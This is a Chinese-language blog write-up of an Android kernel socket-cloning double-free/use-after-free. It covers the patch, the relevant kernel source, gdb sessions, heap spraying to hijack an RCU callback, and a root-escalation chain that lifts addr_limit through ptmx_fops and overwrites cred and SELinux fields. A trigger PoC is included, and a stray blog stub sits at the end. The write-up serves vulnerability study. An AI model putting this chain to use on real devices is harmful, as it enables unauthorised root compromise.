对象何时何处存在浅拷贝 浅拷贝链：tcp_v4_syn_recv_sock -&gt; tcp_create_openreq_child -&gt; inet_csk_clone_lock( ) -&gt; sk_clone_lock( ) -&gt; sock_copy( ) -&gt; […] 对象何时何处被二次使用 释放调用链:sys_close( ) -&gt; filp_close( ) -&gt; fput( ) -&gt; __fput( ) -&gt; sock_close( ) -&gt; sock_release( ) -&gt; inet_release( ) -&gt; ip_mc_drop_socket( ) -&gt; […] 静态分析首先我们看android对该漏洞做的补丁，只是简单的对newsk结构体指针指向的mc_list成员做了下初始化，并没有多余的修补代码，那么我们详细看下newsk是怎么来的，可以看到来源于sk_clone_lock( )函数的返回值，我们直接到sk_clone_lock函数中看看 浅拷贝链：12345678910111213141516171819202122232425262728struct sock *inet_csk_clone_lock(const struct sock *sk, /*克隆一个传输控制块，并对新的传输控制块上锁*/ const struct request_sock *req, const gfp_t priority)&#123; struct sock *newsk = sk_clone_lock(sk, priority); /*从缓冲中分配一个sock，并克隆sk*/ if (newsk) &#123; struct inet_connection_sock *newicsk = inet_csk(newsk); newsk-&gt;sk_state = TCP_SYN_RECV; /*设置新sock的状态为TCP_SYN_RECV*/ newicsk-&gt;icsk_bind_hash = NULL; inet_sk(newsk)-&gt;inet_dport = inet_rsk(req)-&gt;ir_rmt_port; /*设置新sock的目的端口*/ inet_sk(newsk)-&gt;inet_num = inet_rsk(req)-&gt;ir_num; inet_sk(newsk)-&gt;inet_sport = htons(inet_rsk(req)-&gt;ir_num); /*设置新sock的源端口*/ newsk-&gt;sk_write_space = sk_stream_write_space; /* listeners have SOCK_RCU_FREE, not the children */ sock_reset_flag(newsk, SOCK_RCU_FREE); inet_sk(newsk)-&gt;mc_list = NULL; /*补丁位置 添加了一行对mc_list的初始化*/ newsk-&gt;sk_mark = inet_rsk(req)-&gt;ir_mark; atomic64_set(&amp;newsk-&gt;sk_cookie, atomic64_read(&amp;inet_rsk(req)-&gt;ir_cookie)); newicsk-&gt;icsk_retransmits = 0; newicsk-&gt;icsk_backoff = 0; newicsk-&gt;icsk_probes_out = 0; /* Deinitialize accept_queue to trap illegal accesses. */ memset(&amp;newicsk-&gt;icsk_accept_queue, 0, sizeof(newicsk-&gt;icsk_accept_queue)); security_inet_csk_clone(newsk, req); &#125; return newsk; /*返回新sock的内存地址*/&#125; 根据内核源码注释可知sk_clone_lock用于拷贝一个socket，这里先申请一块内存，然后把传入的sk数据拷贝到新申请的内存中，并对新的sk结构体做一些初始化123456789101112131415161718192021222324252627282930313233343536373839/*** sk_clone_lock - clone a socket, and lock its clone* @sk: the socket to clone* @priority: for allocation (%GFP_KERNEL, %GFP_ATOMIC, etc)** Caller must unlock socket even in error path (bh_unlock_sock(newsk))*/struct sock *sk_clone_lock(const struct sock *sk, const gfp_t priority)&#123; struct sock *newsk; bool is_charged = true; newsk = sk_prot_alloc(sk-&gt;sk_prot, priority, sk-&gt;sk_family); /*新sock内存申请函数*/ if (newsk != NULL) &#123; struct sk_filter *filter; sock_copy(newsk, sk); /*浅拷贝函数*/ /* SANITY */ get_net(sock_net(newsk)); [...] skb_queue_head_init(&amp;newsk-&gt;sk_error_queue); filter = rcu_dereference_protected(newsk-&gt;sk_filter, 1); if (filter != NULL) [...] if (unlikely(!is_charged || xfrm_sk_clone_policy(newsk))) &#123; [...] goto out; &#125; newsk-&gt;sk_err = 0; newsk-&gt;sk_priority = 0; /* * Before updating sk_refcnt, we must commit prior changes to memory * (Documentation/RCU/rculist_nulls.txt for details) */ smp_wmb(); atomic_set(&amp;newsk-&gt;sk_refcnt, 2); [...] &#125;out: return newsk; /*返回前面申请的内存首地址,用做newsk*/&#125; 12345678910111213141516171819/** Copy all fields from osk to nsk but nsk-&gt;sk_refcnt must not change yet,* even temporarly, because of RCU lookups. sk_node should also be left as is.* We must not copy fields between sk_dontcopy_begin and sk_dontcopy_end*//*这里的osk就是accept第一个参数socketfd对应的parent_socket，nsk就是accept函数返回的socketfd对应的child_sockfd*/static void sock_copy(struct sock *nsk, const struct sock *osk)&#123;#ifdef CONFIG_SECURITY_NETWORK void *sptr = nsk-&gt;sk_security;#endif /*存在浅拷贝的位置*/ memcpy(nsk, osk, offsetof(struct sock, sk_dontcopy_begin)); memcpy(&amp;nsk-&gt;sk_dontcopy_end, &amp;osk-&gt;sk_dontcopy_end, osk-&gt;sk_prot-&gt;obj_size - offsetof(struct sock, sk_dontcopy_end));#ifdef CONFIG_SECURITY_NETWORK nsk-&gt;sk_security = sptr; security_sk_clone(osk, nsk);#endif&#125; 上面标记拷贝处就是漏洞的成因，因为内核中直接通过memcpy克隆了一个socket，并且未对克隆后的socket中的mc_list结构体变量做初始化，导致了浅拷贝问题，也就是两个socket中存在一个变量同时指向同一块mc_list内存，如果其中一个socket被关闭那么该内存就会被释放，而另一个socket却还残留着这块内存的引用指针，这样就导致uaf漏洞或者doublefree漏洞。 那么该对象是何时何处被申请的呢?内存分配链：sys_setsockopt() -&gt; sock_common_setsockopt() -&gt; tcp_setsockopt() -&gt; ip_setsockopt() -&gt; do_ip_setsockopt() -&gt; ip_mc_join_group( ) -&gt; sock_kmalloc( ) -&gt; […] 1234567891011int ip_setsockopt(struct sock *sk, int level, int optname, char __user *optval, unsigned int optlen)&#123; int err; if (level != SOL_IP) return -ENOPROTOOPT; err = do_ip_setsockopt(sk, level, optname, optval, optlen);#ifdef CONFIG_NETFILTER [……]#endif return err;&#125;EXPORT_SYMBOL(ip_setsockopt); 123456789101112131415161718192021222324252627282930313233343536373839static int do_ip_setsockopt(struct sock *sk, int level, int optname, char __user *optval, unsigned int optlen)&#123; struct inet_sock *inet = inet_sk(sk); int val = 0, err; switch (optname) &#123; case IP_PKTINFO: case IP_RECVTTL: case IP_RECVOPTS:[…]case MCAST_JOIN_GROUP:case MCAST_LEAVE_GROUP:&#123; struct group_req greq; struct sockaddr_in *psin; struct ip_mreqn mreq; if (optlen &lt; sizeof(struct group_req)) goto e_inval; err = -EFAULT; if (copy_from_user(&amp;greq, optval, sizeof(greq))) break; psin = (struct sockaddr_in *)&amp;greq.gr_group; if (psin-&gt;sin_family != AF_INET) goto e_inval; memset(&amp;mreq, 0, sizeof(mreq)); mreq.imr_multiaddr = psin-&gt;sin_addr; mreq.imr_ifindex = greq.gr_interface; if (optname == MCAST_JOIN_GROUP) err = ip_mc_join_group(sk, &amp;mreq); else err = ip_mc_leave_group(sk, &amp;mreq); break;&#125;[…] release_sock(sk); return err;e_inval: release_sock(sk); return -EINVAL;&#125; 12345678910111213141516171819202122int ip_mc_join_group(struct sock *sk , struct ip_mreqn *imr)&#123; int err; __be32 addr = imr-&gt;imr_multiaddr.s_addr; [……] if (count &gt;= sysctl_igmp_max_memberships) goto done; iml = sock_kmalloc(sk, sizeof(*iml), GFP_KERNEL); /* 申请内存 */ if (iml == NULL) goto done; memcpy(&amp;iml-&gt;multi, imr, sizeof(*imr)); iml-&gt;next_rcu = inet-&gt;mc_list; iml-&gt;sflist = NULL; iml-&gt;sfmode = MCAST_EXCLUDE; rcu_assign_pointer(inet-&gt;mc_list, iml); ip_mc_inc_group(in_dev, addr); err = 0;done: rtnl_unlock(); return err;&#125;EXPORT_SYMBOL(ip_mc_join_group); 漏洞利用对象何时何处被二次使用?释放调用链:sys_close –&gt; filp_close –&gt; fput –&gt; __fput –&gt; sock_close –&gt; sock_release –&gt; inet_release –&gt; ip_mc_drop_socket 动态调试可以通过编译内核，然后使用模拟器 + gdb进行动态调试首先在ip_mc_join_group()函数处下断点,运行poc，程序会在ip_mc_join_group函数处断下,单步调试到执行完sock_kmalloc函数此时应该属于第一个socket创建时申请ip_mc_socklist结构体内存，我们记录申请的内存首地址0xc6d2dd80，接着单步运行，直到该函数结尾处记录其结构体中的数据 12345678910111213141516171819202122232425262728293031323334353637383940(gdb) break ip_mc_join_groupBreakpoint 1 at 0xc02ddd8c: file net/ipv4/igmp.c, line 1781.(gdb) cContinuing.Breakpoint 1, ip_mc_join_group (sk=0xd3865240, imr=0xc611de08) at net/ipv4/igmp.c:17811781 &#123;(gdb) n1783 __be32 addr = imr-&gt;imr_multiaddr.s_addr;1781 &#123;[……]1815 iml = sock_kmalloc(sk, sizeof(*iml), GFP_KERNEL);1816 if (iml == NULL)1819 memcpy(&amp;iml-&gt;multi, imr, sizeof(*imr));1820 iml-&gt;next_rcu = inet-&gt;mc_list;1821 iml-&gt;sflist = NULL;1822 iml-&gt;sfmode = MCAST_EXCLUDE;1820 iml-&gt;next_rcu = inet-&gt;mc_list;1823 rcu_assign_pointer(inet-&gt;mc_list, iml);(gdb) p iml$1 = (struct ip_mc_socklist *) 0xc6d2dd80 //申请的内存地址(gdb) p *iml$2 = &#123; next_rcu = 0x0, multi = &#123; imr_multiaddr = &#123; s_addr = 16843240 &#125;, imr_address = &#123; s_addr = 0 &#125;, imr_ifindex = 2 &#125;, sfmode = 0, sflist = 0x0, rcu = &#123; next = 0x0, func = 0x0 &#125;&#125; 紧接着在ip_mc_drop_socket()函数处下断点,让程序继续运行，当poc程序第一次调用关闭socket函数close时，程序会在ip_mc_drop_socket函数处断下，此时我们通过p * iml指令查看一下iml成员中的值，可以看到和我们最开始的一致，然后让程序再次跑起来123456789101112131415161718192021222324252627282930(gdb) break ip_mc_drop_socketBreakpoint 2 at 0xc02de8c8: file net/ipv4/igmp.c, line 2287.(gdb) cContinuing.Breakpoint 2, ip_mc_drop_socket (sk=0xd3864940) at net/ipv4/igmp.c:22872287 &#123;(gdb) n2292 if (inet-&gt;mc_list == NULL)2295 rtnl_lock();2305 atomic_sub(sizeof(*iml), &amp;sk-&gt;sk_omem_alloc);2296 while ((iml = rtnl_dereference(inet-&gt;mc_list)) != NULL) &#123;(gdb) p *iml$3 = &#123; next_rcu = 0x0, multi = &#123; imr_multiaddr = &#123; s_addr = 16843240 &#125;, imr_address = &#123; s_addr = 0 &#125;, imr_ifindex = 2 &#125;, sfmode = 0, sflist = 0x0, rcu = &#123; next = 0x0, func = 0x0 &#125;&#125; 第二次在ip_mc_drop_socket函数断下的时候，说明程序执行到了第二次调用释放socket函数的位置，此时再次查看一下该结构体内存中的数据，可以看到因为第一次释放套接字的时候已经把最开始申请的内存释放了,并且已经成功喷射成了我们伪造的数据，0xc6d2dd80已经指向的是我们喷射的数据，因为0xb6efb000是我们在Exp中使用mmap映射出来的地址，所以sflist指针指向的是我们用户态随意控制的数据12345678910111213141516171819202122232425262728293031(gdb) cContinuing.Breakpoint 2, ip_mc_drop_socket (sk=0xd3865240) at net/ipv4/igmp.c:22872287 &#123;(gdb) n2292 if (inet-&gt;mc_list == NULL)2295 rtnl_lock();2305 atomic_sub(sizeof(*iml), &amp;sk-&gt;sk_omem_alloc);2296 while ((iml = rtnl_dereference(inet-&gt;mc_list)) != NULL) &#123;2299 inet-&gt;mc_list = iml-&gt;next_rcu;(gdb) p iml$4 = (struct ip_mc_socklist *) 0xc6d2dd80(gdb) p *iml$5 = &#123; next_rcu = 0x0, multi = &#123; imr_multiaddr = &#123; s_addr = 0 &#125;, imr_address = &#123; s_addr = 0 &#125;, imr_ifindex = 123456 &#125;, sfmode = 0, sflist = 0xb6efb000, rcu = &#123; next = 0x0, func = 0x0 &#125;&#125; 查看一下sflist指针指向的内存数据，然后对照下内核源码中的该结构体，0xeeeeeeee正好就是函数指针，并且在ip_mc_leave_src函数中存在一个kfree_rcu函数可以把sflist指向的psf变量中的callback_head链入到rcu回调函数链表中，我们只要精心构造一下喷射数据就可以成功执行到该kfree_rcu处 (gdb) x/10x 0xb6efb000 0xb6efb000: 0x00000000 0x00000000 0x00000000 0xeeeeeeee 0xb6efb010: 0x00000000 0x00000000 0x00000000 0x00000000 0xb6efb020: 0x00000000 0x00000000 12345678910111213141516171819202122232425262728293031ip_mc_leave_src (sk=0xd3865240, iml=0xc6d2dd80, in_dev=0x0) at net/ipv4/igmp.c:18341834 &#123;(gdb) s1835 struct ip_sf_socklist *psf = rtnl_dereference(iml-&gt;sflist);(gdb) s1834 &#123;1838 if (psf == NULL) &#123;1844 iml-&gt;sfmode, psf-&gt;sl_count, psf-&gt;sl_addr, 0);1843 err = ip_mc_del_src(in_dev, &amp;iml-&gt;multi.imr_multiaddr.s_addr,1845 RCU_INIT_POINTER(iml-&gt;sflist, NULL);1847 atomic_sub(IP_SFLSIZE(psf-&gt;sl_max), &amp;sk-&gt;sk_omem_alloc);1843 err = ip_mc_del_src(in_dev, &amp;iml-&gt;multi.imr_multiaddr.s_addr,1847 atomic_sub(IP_SFLSIZE(psf-&gt;sl_max), &amp;sk-&gt;sk_omem_alloc);(gdb) p psf$6 = (struct ip_sf_socklist *) 0xb6efb000(gdb) p *psf$7 = &#123; sl_max = 0, sl_count = 0, rcu = &#123; next = 0x0, func = 0xeeeeeeee &#125;, sl_addr = 0xb6efb010&#125;1848 kfree_rcu(psf, rcu);(gdb) x/10x 0xb6efb0000xb6efb000: 0x00000000 0x00000000 0x00000000 0x000000080xb6efb010: 0x00000000 0x00000000 0x00000000 0x000000000xb6efb020: 0x00000000 0x00000000 注意:因为kfree_rcu函数会把我们设置的rcu-&gt;func的值修改为别的数据，所以我们调试的时候手动把用户态地址0xb6efb00c中的值修改回0xeeeeeeee(写Exp的时候可以开一个线程循环对其修改即可)当设置好ruc回调函数后等着内核调用就好了,这样就顺利的控制了内核态的PC指针,并且参数1是可控。1234567891011121314static inline bool __rcu_reclaim(char *rn, struct rcu_head *head)&#123; unsigned long offset = (unsigned long)head-&gt;func; if (__is_kfree_rcu_offset(offset)) &#123; RCU_TRACE(trace_rcu_invoke_kfree_callback(rn, head, offset)); kfree((void *)head - offset); return 1; &#125; else &#123; RCU_TRACE(trace_rcu_invoke_callback(rn, head)); head-&gt;func(head); /*控制执行流*/ return 0; &#125;&#125; 需要喷射的结构体1234567struct ip_mc_socklist &#123; struct ip_mc_socklist __rcu *next_rcu; struct ip_mreqn multi; unsigned int sfmode; /* MCAST_&#123;INCLUDE,EXCLUDE&#125; */ struct ip_sf_socklist __rcu *sflist; struct rcu_head rcu;&#125;; 用户态伪造结构体123456struct ip_sf_socklist &#123; unsigned int sl_max; unsigned int sl_count; struct rcu_head *rcu; __be32 sl_addr[0];&#125;; Root提权现在我们已经能够成功劫持内核执行流程了,接下来要做的就是如何劫持内核执行来达到内核提权的效果。1.修改exp进程的addr_limit字段,实现内核任意访问虽然成功劫持了内核的执行,但是离我们的目标还差一步,因为现在的内核默认是开启了PXN(Privileged execute-never)保护的,所以我们不能直接让内核去执行我们用户态的权限提升shellcode,我们需要实现对内核进行任意读写,通过任意读写来完成权限提升。 首先我们来看一个结构体123456789101112131415struct thread_info &#123; struct pcb_struct pcb; /* palcode state */ struct task_struct *task; /* main task structure */ unsigned int flags; /* low level flags */ unsigned int ieee_state; /* see fpu.h */ struct exec_domain *exec_domain; /* execution domain */ mm_segment_t addr_limit; /* thread address space */ unsigned cpu; /* current CPU */ int preempt_count; /* 0 =&gt; preemptable, &lt;0 =&gt; BUG */ unsigned int status; /* thread-synchronous flags */ int bpt_nsaved; unsigned long bpt_addr[2]; /* breakpoint handling */ unsigned int bpt_insn[2]; struct restart_block restart_block;&#125;; 系统中的每一个线程都会分配自己的堆栈,其底部存在一个thread_info结构体,该结构体记录着当前线程的一些属性,结构体中的addr_limit元素表示当前线程可访问的地址空间,就是因为该元素所以正常情况下我们用户态程序不能访问内核态内存,但是如果我们把该字段的内容改为-1(0xffffffffffffffff),那么对应的线程就能访问任意内核地址了。 但是我们如何去修改addr_limit呢? 泄漏线程sp,计算thread_info地址,索引修改addr_limit 1234/* 通过泄漏的sp计算出thread_info的地址 THREAD_SIZE==8192 */ static inline struct thread_info *current_thread_info(void) &#123; return (struct thread_info *)(current_stack_pointer &amp; ~(THREAD_SIZE - 1)); &#125; 利用内核中本来就存在的对addr_limit值进行修改的函数,不过一般这类函数都是成对出现,先修改为新值,再恢复为原始值,我们需要想办法绕过恢复操作(例:kernel_sock_ioctl) 123456789int kernel_sock_ioctl(struct socket *sock, int cmd, unsigned long arg)&#123; mm_segment_t oldfs = get_fs(); int err; set_fs(KERNEL_DS); /* 修改addr_limit为0xffffffffffffffff*/---- err = sock-&gt;ops-&gt;ioctl(sock, cmd, arg); /* 参数1可控函数指针 直接跳转到return err处执行*/| set_fs(oldfs); /* 恢复旧的addr_limit 跳过该条指令的执行*/---&gt; return err;&#125; 在内核函数中存在一个kernel_sock_ioctl函数,该函数存在一个函数指针调用,而这个函数指针又正由参数1所控制,我们就可以在执行完set_fs(KERNEL_DS)函数完后,如果参数1可控,通过控制的函数指针,直接跳转到函数末尾处,这样就绕过了set_fs(oldfs)恢复addr_limit的操作。这里需要注意的是,我们不能在最开始通过触发漏洞去劫持内核执行流程时调用kernel_sock_ioctl函数修改addr_limit,因为这样调用修改的不是我们exp线程的thread_info中的addr_info,只有exp线程调用kernel_sock_ioctl函数修改的才是exp线程的thread_info中的addr_info成员,但是kernel_sock_ioctl函数用户态程序是不能直接调用的,那么如何实现让用户态调用该函数呢?我们知道在linux内核中有许多file_operations结构体类型的全局符号,这类结构体有个特点就是其成员是一组函数指针,每个打开的文件(在内部由一个file结构体表示)都会和一组函数指针关联(通过包含指向一个file_operation结构的f_op字段),这组函数指针用来完成一些用户层函数的功能,用户层可以调用对应的用户层API来触发这些函数指针,我们可以查找一个file_operation结构体变量,把它的某个函数指针指向kernel_sock_ioctl函数,再去调用这个函数指针对应的应用层API，这样的话实际调用的其实是kernel_sock_ioctl函数。合适的函数指针需要满足以下条件: 该函数指针可以被用户层触发调用。 函数指针的参数1可以被我们伪造成想要的结构体。 查找内核源码发现全局符号ptmx_fops中的check_flags函数指针比较合适。我们可以通过/proc/kallsyms文件来获取我们需要的符号地址(ptmx_fops-&gt;check_flags,kernel_sock_ioctl),同时还需要在内核中找到一条能完成任意地址写的ROP链,常用的查找工具有ROPgadget,在触发漏洞控制内核执行时调用这条ROP链,把kernel_sock_ioctl函数地址写入到ptmx_fops-&gt;check_flags函数指针中,修改完毕后让exp线程去打开/dev/ptmx文件,使用fcntl(fd, F_SETFL, jopdata)去触发kernel_sock_ioctl函数,jopdata为我们控制的参数1,可以使用mmap来映射出一片地址,伪造一个socket结构体来控制内核函数kernel_sock_ioctl的跳转位置。这样就轻松修改了exp的addr_limit元素,exp进程就能轻易地对内核进行任意访问了。 2.封装pipe函数,实现内核任意读写,获取exp进程的task_struct结构体,通过task_struct结构体获取该进程的cred结构体 因为exp进程已经可以对内核态任意访问,我们就可以直接在用户态使用pipe对内核进行任意读写,现在我们需要找到exp进程的task_struct结构体,然后根据task_struct结构体去查找cred结构体。 查找task_struct结构体有两种方法。 在线程的thread_info中就存在task_struct结构体,可以通过泄漏sp,然后计算出当前线程的task_struct,不过不适合当前这个漏洞 通过inti进程的task_struct结构体的特征码,暴力搜索。根据/proc/iomem文件获取内存分布,算出init进程task_struct可能存在的区间,找到init进程的task_struct后通过结构体内部链表进行遍历exp进程的task_struct结构体 3.修改cred结构体中的关键字段(uid,gid….)切换SELinux context并关闭SELinux,实现权限提升 通过找到exp的task_struct索引cred结构体,对cred结构体中的几个关键的字段进行修改:1234567891011121314151617181920212223242526272829303132333435363738struct cred &#123; atomic_t usage;#ifdef CONFIG_DEBUG_CREDENTIALS atomic_t subscribers; /* number of processes subscribed */ void *put_addr; unsigned magic;#define CRED_MAGIC 0x43736564#define CRED_MAGIC_DEAD 0x44656144#endif kuid_t uid; /* real UID of the task */ kgid_t gid; /* real GID of the task */ kuid_t suid; /* saved UID of the task */ kgid_t sgid; /* saved GID of the task */ kuid_t euid; /* effective UID of the task */ kgid_t egid; /* effective GID of the task */ kuid_t fsuid; /* UID for VFS ops */ kgid_t fsgid; /* GID for VFS ops */ unsigned securebits; /* SUID-less security management */ kernel_cap_t cap_inheritable; /* caps our children can inherit */ kernel_cap_t cap_permitted; /* caps we're permitted */ kernel_cap_t cap_effective; /* caps we can actually use */ kernel_cap_t cap_bset; /* capability bounding set */#ifdef CONFIG_KEYS unsigned char jit_keyring; /* default keyring to attach requested * keys to */ struct key __rcu *session_keyring; /* keyring inherited over fork */ struct key *process_keyring; /* keyring private to this process */ struct key *thread_keyring; /* keyring private to this thread */ struct key *request_key_auth; /* assumed request_key authority */#endif#ifdef CONFIG_SECURITY void *security; /* subjective LSM security */ /* &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; selinux context &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; task_security_struct */#endif struct user_struct *user; /* real user ID subscription */ struct user_namespace *user_ns; /* user_ns the caps and keyrings are relative to. */ struct group_info *group_info; /* supplementary groups for euid/fsgid */ struct rcu_head rcu; /* RCU deletion hook */&#125;; 进程uid,gid相关的字段改为0(root对应的uid,gid) 12345678cred.uid = 0;cred.gid = 0;cred.suid = 0;cred.sgid = 0;cred.euid = 0;cred.egid = 0;cred.fsuid = 0;cred.fsgid = 0; 进程capability相关的字段改为0xffffffffffffffff(表示全部拥有),每个进程有三个和能力相关的位图:inheritable(I),permitted(P),effective(E)可以通过cat /proc/PID/status来查看进程所拥有的能力。 12345678cred.cap_inheritable.cap[0] = -1; /* cap_inheritable:表示被当前进程执行的程序能够继承的能力 */cred.cap_inheritable.cap[1] = -1;cred.cap_permitted.cap[0] = -1; /* cap_permitted:表示进程能够使用的能力*/cred.cap_permitted.cap[1] = -1;cred.cap_effective.cap[0] = -1; /* cap_effective:表示进程实际拥有的能力,当进程要进行某个特权操作时,内核会检查cap_effective对应位是否有效,[权限列表](http://man7.org/linux/man-pages/man7/capabilities.7.html)*/cred.cap_effective.cap[1] = -1;cred.cap_bset.cap[0] = -1;cred.cap_bset.cap[1] = -1; cred结构体中的security成员指向task_security_struct结构体,编译条件CONFIG_SECURITY,提权时需要把该结构体中的osid,sid修改为init进程对应的soid,sid这样的话exp进程的selinux context就切换成了init对应的selinux context了 12345678struct task_security_struct &#123; u32 osid; /* SID prior to last execve */ u32 sid; /* current SID */ u32 exec_sid; /* exec SID */ u32 create_sid; /* fscreate SID */ u32 keycreate_sid; /* keycreate SID */ u32 sockcreate_sid; /* fscreate SID */&#125;; 触发模型:12345678910111213141516setsockopt(parent_socket, 0x0, MCAST_JOIN_GROUP, &amp;group, sizeof(group)); //申请内存if (listen(parent_socket, 2))&#123; perror(\"error: \\n\"); exit(1);&#125;if(1)&#123; socklen_t len = 0; child_sockfd = accept(parent_socket,(sockaddr*)&amp;client,&amp;len); //创建子套接字,并和父套接字共用同一块内存 if (child_sockfd == -1)&#123; perror(\"error: \\n\"); return 0; &#125; close(child_sockfd); //关闭子套接字,第一次释放&#125;sleep(4);close(parent_socket); //关闭父套接字,第二次释放 总结1.在使用GDB调试时使用set print pretty on选项,查看结构体的时候会更加的直观。2.官方说漏洞属于DoubleFree漏洞,但是我们利用时使用的却是UAF常用利用方法。 通过喷射占位结构体,然后使用喷射结构体中的某个函数指针对执行流进行控制 把Double Free漏洞转换为Use After Free漏洞 3.在文中有些地方表述的还不是太清楚,还需要通过多写文章进行练习表达能力","categories":[{"name":"Vulnerability","slug":"Vulnerability","permalink":"http://github.com/categories/Vulnerability/"}],"tags":[{"name":"Android_Kernel","slug":"Android-Kernel","permalink":"http://github.com/tags/Android-Kernel/"}]},{"title":"@Let_go","slug":"Let-go","date":"2017-03-25T15:26:24.000Z","updated":"2018-08-26T10:38:44.510Z","comments":true,"path":"2017/03/25/Let-go/","link":"","permalink":"http://github.com/2017/03/25/Let-go/","excerpt":"","text":"@Let_go 你好,欢迎来到我的个人技术博客.https://pandao.github.io/editor.md/index.html [markdown在线编辑]https://ijiaober.github.io/2014/08/02/hexo/hexo-index [hexo使用攻略]https://linlif.github.io/2017/05/27/Hexo%E4%BD%BF%E7%94%A8%E6%94%BB%E7%95%A5-%E6%B7%BB%E5%8A%A0%E5%88%86%E7%B1%BB%E5%8F%8A%E6%A0%87%E7%AD%BE/ [源文章中的head部分添加]","categories":[{"name":"Let_go","slug":"Let-go","permalink":"http://github.com/categories/Let-go/"}],"tags":[{"name":"Let1","slug":"Let1","permalink":"http://github.com/tags/Let1/"},{"name":"Let2","slug":"Let2","permalink":"http://github.com/tags/Let2/"},{"name":"Let3","slug":"Let3","permalink":"http://github.com/tags/Let3/"}]}]}